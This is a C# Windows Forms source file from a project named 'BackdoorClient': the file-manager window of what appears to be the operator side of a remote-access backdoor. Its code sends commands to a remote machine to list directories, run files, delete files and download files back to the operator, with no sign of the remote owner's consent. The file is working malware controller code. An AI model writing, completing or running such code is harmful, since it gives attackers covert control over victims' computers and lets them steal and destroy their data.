using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;

namespace BackdoorClient
{
    public partial class FileManager : Form
    {
        public Form1 mainForm;
 
        public FileManager(Form1 form)
        {
            mainForm = form;
            InitializeComponent();
        }

        private void FileManager_Load(object sender, EventArgs e)
        {
            if (!mainForm.TestConnect())
            {
              
                this.Close();
                return;
            }
            RefreshFileMgr();
        }

        private void RefreshFileMgr()
        {
            XmlDocument doc = new XmlDocument();
            string docContent = mainForm.SendCommandAndGetResponce($"ls ${pathTextBox.Text}");

            doc.LoadXml(docContent);

            XmlNode root = doc.FirstChild;
            filesView.Nodes.Clear();
            if (root.HasChildNodes)
            {
                for (int i = 0; i < root.ChildNodes.Count; i++)
                {
                    filesView.Nodes.Add(root.ChildNodes[i].InnerText);
                }
            }
            statsLabel.Text = "Найдено: " + $"файлов и папок {filesView.Nodes.Count}";
        }

        private void startFileBut_Click(object sender, EventArgs e)
        {
            string s = $"start ${pathTextBox.Text + "/" + filesView.SelectedNode.Text.Remove(0,1)}";
            resulteText.Text = mainForm.SendCommandAndGetResponce(s);//$"start ${pathTextBox.Text + "/" + filesView.SelectedNode.Text}");
        }

        private void removeFileButton_Click(object sender, EventArgs e)
        {
            resulteText.Text = mainForm.SendCommandAndGetResponce($"rm ${pathTextBox.Text + "/" + filesView.SelectedNode.Text.Remove(0,1)}");
            RefreshFileMgr();
        }

        private void refreshFilesBut_Click(object sender, EventArgs e)
        {
            RefreshFileMgr();
        }

        private void downloadBut_Click(object sender, EventArgs e)
        {
            try
            {
                System.IO.File.WriteAllBytes(filesView.SelectedNode.Text, mainForm.SendCommandAndGetBytesResponce($"download ${pathTextBox.Text + "/" + filesView.SelectedNode.Text}"));
            }
            catch(Exception er)
            {
                MessageBox.Show($"Error in download file {er.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void RefreshtoolStripMenuItem_Click(object sender, EventArgs e)
        {
            RefreshFileMgr();
        }

        private void goToFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            pathTextBox.Text = pathTextBox.Text + filesView.SelectedNode.Text;
            RefreshFileMgr();
        }

        private void goToParentFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (pathTextBox.Text == "/" || pathTextBox.Text.EndsWith("/")) return;
            for (int i = pathTextBox.Text.Length - 1; i > 0; i--)
            {
                if (pathTextBox.Text[i] == '/')
                {
                    pathTextBox.Text = pathTextBox.Text.Remove(i, pathTextBox.Text.Length - i);
                    break;
                }
            }

            RefreshFileMgr();
        }

        private void fileManagmentMenu_Opening(object sender, CancelEventArgs e)
        {
            if (filesView.SelectedNode == null)
            {
                for (int i = 0; i < fileManagmentMenu.Items.Count; i++)
                {
                    if (i == 2)
                    {
                        fileManagmentMenu.Items[i].Enabled = true; continue;
                    }
                    fileManagmentMenu.Items[i].Enabled = false;
                }
                return;
            }
            else
            {
                for (int i = 0; i < fileManagmentMenu.Items.Count; i++) fileManagmentMenu.Items[i].Enabled = true;
            }
            if (!filesView.SelectedNode.Text.StartsWith("/")) fileManagmentMenu.Items[1].Enabled = false; else fileManagmentMenu.Items[1].Enabled = true;
            if (filesView.SelectedNode.Text.StartsWith("/")) fileManagmentMenu.Items[3].Enabled = false; else fileManagmentMenu.Items[3].Enabled = true;
            if (filesView.SelectedNode.Text.StartsWith("/")) fileManagmentMenu.Items[4].Enabled = false; else fileManagmentMenu.Items[4].Enabled = true;
            if (filesView.SelectedNode.Text.StartsWith("/")) fileManagmentMenu.Items[5].Enabled = false; else fileManagmentMenu.Items[5].Enabled = true;
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string s = $"start ${pathTextBox.Text + "/" + filesView.SelectedNode.Text.Remove(0, 1)}";
            resulteText.Text = mainForm.SendCommandAndGetResponce(s);//$"start ${pathTextBox.Text + "/" + filesView.SelectedNode.Text}");
        }
    }
}
